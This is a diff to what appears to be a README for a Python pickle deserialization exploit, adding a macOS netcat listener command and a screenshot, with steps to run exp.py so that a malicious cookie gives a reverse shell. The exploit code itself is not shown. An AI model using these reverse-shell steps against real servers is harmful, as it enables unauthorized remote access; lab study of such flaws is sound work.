@@ -54,16 +54,25 @@ class exp(object):
 
 To execute the exploit, first set up a netcat listener on your machine to receive the reverse shell:
 
-```
+```bash
 nc -lvp 80
+
+# on mac you just need
+# Because macOS comes with the BSD version of netcat, not the GNU version.
+nc -lv 80
 ```
 
 Then run the exploit script to send the malicious cookie to the vulnerable application:
 
-```
+```bash
 python3 exp.py
 ```
 
 When the server deserializes the malicious pickle object, it will execute the command and establish a reverse shell connection to your machine:
 
 ![Reverse Shell Demonstration](1.png)
+
+
+Test on Mac:
+
+![Reverse Shell Demonstration on Mac](mac.png)
